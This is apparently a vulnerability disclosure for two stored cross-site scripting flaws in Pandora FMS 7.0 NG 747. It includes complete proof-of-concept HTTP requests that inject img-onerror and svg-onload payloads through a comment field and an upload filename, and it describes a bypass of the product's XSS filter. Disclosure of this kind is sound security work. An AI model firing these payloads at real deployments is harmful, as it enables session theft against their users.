# Pandora-FMS-7.0-NG-747-Stored-XSS-Vulnerabilities
Two stored cross-site scripting (XSS) in [Pandora FMS 7.0 NG 747](https://pandorafms.org/features/free-download-monitoring-software/) can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page. In addition, the existing XSS filter can be bypassed with the "<img" tag.

Pandora FMS 7.0 NG747 and older versions are affected by these vulnerabilities.


# PoC-1 (comment)
To exploit vulnerability, someone could use a POST request to '/pandora_console/ajax.php' by manipulating 'comment' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /pandora_console/ajax.php HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 119
DNT: 1
Connection: close
Cookie: PHPSESSID=a55pr5b4gff5ea1h0pms4csrk5

page=include/ajax/events&add_comment=1&event_id=7&comment=<img src=x onerror="alert(document.cookie)">&meta=0&history=0
```

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-01.png)

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-02.png)

# PoC-2 (filename)
To exploit vulnerability, someone could use a POST request to '/pandora_console/index.php?sec=workspace&sec2=operation/incidents/incident_detail&id=3&upload_file=1' by manipulating 'filename' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
POST /pandora_console/index.php?sec=workspace&sec2=operation/incidents/incident_detail&id=3&upload_file=1 HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------188134206132629608391758747427
Content-Length: 524
DNT: 1
Connection: close
Cookie: PHPSESSID=3098fl65su4l237navvq6d5igs
Upgrade-Insecure-Requests: 1

-----------------------------188134206132629608391758747427
Content-Disposition: form-data; name="userfile"; filename="\"><svg onload=alert(document.cookie)>.png"
Content-Type: image/png

"><svg onload=alert(1)>
-----------------------------188134206132629608391758747427
Content-Disposition: form-data; name="file_description"

desc
-----------------------------188134206132629608391758747427
Content-Disposition: form-data; name="upload"

Upload
-----------------------------188134206132629608391758747427--

```

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-v2-01.png)

![](https://emreovunc.com/blog/en/Pandora-FMS-7.0-NG-747-Stored-XSS-v2-02.png)
